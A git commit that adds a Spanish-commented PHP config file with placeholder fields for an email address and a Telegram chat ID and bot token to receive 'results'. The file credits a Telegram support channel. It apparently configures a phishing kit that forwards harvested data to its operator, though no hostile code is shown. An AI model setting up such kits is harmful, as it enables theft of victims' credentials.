fe25d3f1270db03e9c7ce0a41281ff2cdc9e1f6e
Jeniffer Hurtado Coronado <danielnetflix300@gmail.com>
2024-04-16 13:32:45 -0300

    init

---
+++ config.php
@@ -0,0 +1,19 @@
+<?php
+/**
+###############################################
+# Soporte https://t.me/eyezhouse   			  #
+###############################################
+**/
+	$text = "eyez"; //
+	// ================================= //
+	$yours = "tuemailejemplo@tuemailejemplo.com";              // Ingresa tu mail para los resultados vía correo
+	// ================================= //	
+	$id='-000000000000';           						   // Ingresa el ID del chat de teleg
+	$key = '0000000000:0000000000000000000000000000000';   // Ingresa el token del b0t
+    // ===================================== //
+	function now() {
+		date_default_timezone_set('America/Argentina/Buenos_Aires'); //
+		return date("d/m/Y h:i:sa");
+	}
+    // ===================================== //
+?>
